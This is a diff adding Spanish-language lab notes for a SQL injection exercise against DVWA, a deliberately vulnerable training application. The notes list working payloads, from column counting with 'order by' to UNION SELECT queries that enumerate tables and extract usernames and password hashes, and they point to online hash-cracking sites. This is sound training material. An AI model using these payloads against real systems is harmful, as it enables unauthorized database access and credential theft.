@@ -1,1 +1,18 @@
+++ Web browser
+--- dvwa security = low
+--- sql injection 
+--- user id: 1 ---> submit
+--- ' ---> submit (Se despliega un mensaje de error lo que indica que la consulta no está siendo verificada en el inputbox antes de ser procesada)
+--- 1' order by 3# ---> submit (Nos aparece el mensaje de unknown colum 3 in order clause, lo que nos confirma nuevamente que el inputbox no válida la entrada. Basicamente esto nos indica que una tercer columna no existe)
+--- 1' order by 2# ---> submit (Se muestra un resultado de la consulta asociado a dos columnas, first name y surname)
+--- union select user(), database()# ---> submit (Se muestra una salida asociada al nombre de usuario y al nombre de la base de datos)
+--- ' union select 1, group_concat(table_name) from information_schema.tables where table_schema='dvwa'# ---> submit (Se muestran todas las tablas dentro de la base de datos dvwa)
+--- ' union select 1, group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'# (Se muestran las columnas asociadas a la tabla users dentro de la base de datos dvwa) 
+--- ' union select user, password from dvwa.users limit 0,1# (Se muestran los registros asociados a la tabla users, acotando las columnas user y password y los registros desde el 0 hasta el 1
+---- Nos aparece el password con un hash
+---- Usamos la herramienta crackstation para obtener el valor del hash:
+----- https://crackstation.net/
+---- También podemos usar la herramienta md5 encryption/decryption:
+----- https://10015.io/tools/md5-encrypt-decrypt
+
 
